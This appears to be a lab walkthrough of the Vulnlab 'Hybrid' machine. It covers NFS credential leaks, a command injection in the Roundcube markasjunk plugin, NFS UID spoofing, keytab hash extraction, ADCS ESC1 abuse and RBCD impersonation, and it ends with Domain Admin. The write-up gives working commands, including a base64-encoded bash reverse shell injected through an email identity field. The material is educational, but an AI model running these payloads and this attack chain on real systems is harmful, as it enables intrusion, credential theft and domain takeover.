![](images/hybrid.png)]
IPs: `10.10.215.165` `10.10.215.166`
# Recon
Nmap:
10.10.215.166 mail01.hybrid.vl
```
22/tcp   open  ssh      syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp     syn-ack Postfix smtpd
80/tcp   open  http     syn-ack nginx 1.18.0 (Ubuntu)
110/tcp  open  pop3     syn-ack Dovecot pop3d
111/tcp  open  rpcbind  syn-ack 2-4 (RPC #100000)
143/tcp  open  imap     syn-ack Dovecot imapd (Ubuntu)
587/tcp  open  smtp     syn-ack Postfix smtpd
993/tcp  open  ssl/imap syn-ack Dovecot imapd (Ubuntu)
995/tcp  open  ssl/pop3 syn-ack Dovecot pop3d
2049/tcp open  nfs      syn-ack 3-4 (RPC #100003)
```

10.10.215.165
```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-01 12:44:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

There is a roundcube instance listening on port 80.

rpcbind and nfs are open, going to check nfs shares:
```
$ showmount -e 10.10.215.166 
Export list for 10.10.215.166:
/opt/share *
```

# RoundCube CVE

Mounting the share shows a backup file.
```
├── etc
│   ├── dovecot
│   │   └── dovecot-users
│   ├── passwd
│   ├── postfix
│   │   └── main.cf
│   └── sssd
│       └── sssd.conf
└── opt
    └── certs
        └── hybrid.vl
            ├── fullchain.pem
            └── privkey.pem

```

The dovecot-users has credentials!
```
admin@hybrid.vl:{plain}Duckling21
peter.turner@hybrid.vl:{plain}PeterIstToll!
```

Logging in with the admin account and looking around shows a few interesting things.

The application version is: `Roundcube Webmail 1.6.1` and the `markasjunk` plugin is installed.

There is an advisory talking about how the `markasjunk` extension can be used to get RCE:
https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/

"The vulnerability can be triggered by any Roundcube user who can change his email identity as well as mark an email as junk, both being trivial requirements."

There is also a nice POC: `admin&touch${IFS}test.txt&@roundcube.com`

So something like `&curl${IFS}http://10.8.0.110:8080/shell.sh|bash&` should work.

There is a black list for the `:` char, so going to have to decode via b64 instead.

```
&echo${IFS}YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuOC4wLjExMC85MDAxICAwPiYx|base64${IFS}-d|bash&
```

This works giving a shell as `www-data` on the box.

# NFS privesc

Looking around shows that there is another user called: `peter.turner@hybrid.vl` on the box. Using this you can privesc to this user via nfs by manipulating the UIDs.

To do this we need to get a copy of bash off the target then create a new user with the same id as `peter.turner@hybrid.vl`.

```
sudo useradd -u 902601108 "peter.turner@hybrid.vl" --badname
```

Then we can bash back to the share and mark it as a setuid:

```
su peter.turner@hybrid.vl
chmod +s bash
```

Then to privesc: `/opt/share/bash -p` and we are `peter.turner`

There is a keepass db, using the password from before gives domain creds:
```
peter.turner:b0cwR+G4Dzl_rw
```

This user can run ALL ALL as root, so root on mail01!

# Domain Admin
As this box is domain joined, we can read the keytab file to get the machine hash:
```
python3 keytabextract.py ~/vulnlab/hybrid/krb5.keytab
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : HYBRID.VL
        SERVICE PRINCIPAL : MAIL01$/
        NTLM HASH : 0f916c5246fdbc7ba95dcef4126d57bd
        AES-256 HASH : eac6b4f4639b96af4f6fc2368570cde71e9841f2b3e3402350d3b6272e436d6e
        AES-128 HASH : 3a732454c95bcef529167b6bea476458
```

Looking for quick wins with ADCS:
```
certipy find -text -stdout -u peter.turner@hybrid.vl -p b0cwR+G4Dzl_rw -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)                                           
[*] Finding certificate templates
[*] Found 34 certificate templates
...snip...
Certificate Authorities
  0
    CA Name                             : hybrid-DC01-CA
    DNS Name                            : dc01.hybrid.vl
    Certificate Subject                 : CN=hybrid-DC01-CA, DC=hybrid, DC=vl
    Certificate Serial Number           : 26774D897E4EA8BD4DC8C54094064183
    Certificate Validity Start          : 2023-06-17 14:04:39+00:00
    Certificate Validity End            : 2124-10-01 12:38:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Unknown
    Request Disposition                 : Unknown
    Enforce Encryption for Requests     : Unknown
Certificate Templates
  0
    Template Name                       : HybridComputers
    Display Name                        : HybridComputers
    Certificate Authorities             : hybrid-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Domain Computers
                                          HYBRID.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : HYBRID.VL\Administrator
        Write Owner Principals          : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
                                          HYBRID.VL\Administrator
        Write Dacl Principals           : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
                                          HYBRID.VL\Administrator
        Write Property Principals       : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
                                          HYBRID.VL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'HYBRID.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

Requesting a certificate as administrator:
```
certipy req -username MAIL01\$@hybrid.vl -hashes 0f916c5246fdbc7ba95dcef4126d57bd -target-ip dc01.hybrid.vl -ca 'hybrid-DC01-CA' -template 'HybridComputers' -upn 'administrator@hybrid.vl' -debug -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'HYBRID.VL' at '192.168.1.1'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:dc01.hybrid.vl[\pipe\cert]
[+] Connected to endpoint: ncacn_np:dc01.hybrid.vl[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'administrator@hybrid.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Then requesting a TGT:
```
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'hybrid.vl' -dc-ip 10.10.215.165 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@hybrid.vl
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)
```

This shows that PKINIT is not set up for this Domain, instead we can request a certificate for the domain controller and set up rbcd for a domain admin.

```
certipy req -username MAIL01\$@hybrid.vl -hashes 0f916c5246fdbc7ba95dcef4126d57bd -target-ip dc01.hybrid.vl -ca 'hybrid-DC01-CA' -template 'HybridComputers' -upn 'dc01$@hybrid.vl' -debug -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'HYBRID.VL' at '192.168.1.1'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:dc01.hybrid.vl[\pipe\cert]
[+] Connected to endpoint: ncacn_np:dc01.hybrid.vl[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'dc01$@hybrid.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'dc01.pfx'
```

Convert the pfx to cert and key:
```
$ certipy cert -pfx dc01.pfx -nokey -out dc.crt
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'dc.crt'

$ certipy cert -pfx dc01.pfx -nocert -out dc.key
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'dc.key'
```

Configure RBCD:
```
python3 passthecert.py -action write_rbcd -crt dc.crt -key dc.key -domain hybrid.vl -dc-ip 10.10.215.165 -delegate-to 'DC01$' -delegate-from 'mail01$'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] mail01$ can now impersonate users on DC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     MAIL01$      (S-1-5-21-3436099999-75120703-3673112333-1103)
```

Request a ticket.
```
getST.py -spn 'cifs/dc01' -impersonate administrator -dc-ip '10.10.215.165' 'hybrid.vl/mail01$' -hashes :0f916c5246fdbc7ba95dcef4126d57bd
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc01@HYBRID.VL.ccache

```

login with wmiexec:
```
KRB5CCNAME=$(pwd)/administrator@cifs_dc01@HYBRID.VL.ccache wmiexec.py -k -no-pass administrator@dc01
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used

[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
dc01
C:\>whoami
hybrid\administrator
```

TaDa!

# Beyond Root

Overall a really nice box, there a two things that I would like to change tho,

1. Remove RBCD
2. Request a TGT then HOST and CIFS Service Tickets before authing to wmiexec.

Both these are easy to do.

To remove RBCD I found out you can just specify `flush_rbcd` in passthecert
```
python3 passthecert.py -action flush_rbcd -crt dc.crt -key dc.key -domain hybrid.vl -dc-ip 10.10.215.165 -delegate-to 'DC01$'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Accounts allowed to act on behalf of other identity:
[*]     MAIL01$      (S-1-5-21-3436099999-75120703-3673112333-1103)
[*] Delegation rights flushed successfully!
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
```

For the proper kerberos flow I requested a TGT for mail01$ then requested a cifs ticket.
```
$ getTGT.py -hashes :0f916c5246fdbc7ba95dcef4126d57bd 'hybrid.vl/mail01$'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in mail01$.ccache

$ KRB5CCNAME=$(pwd)/mail01\$.ccache getST.py -spn 'cifs/dc01' -impersonate administrator -dc-ip '10.10.215.165' 'hybrid.vl/mail01$' -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc01@HYBRID.VL.ccache
```
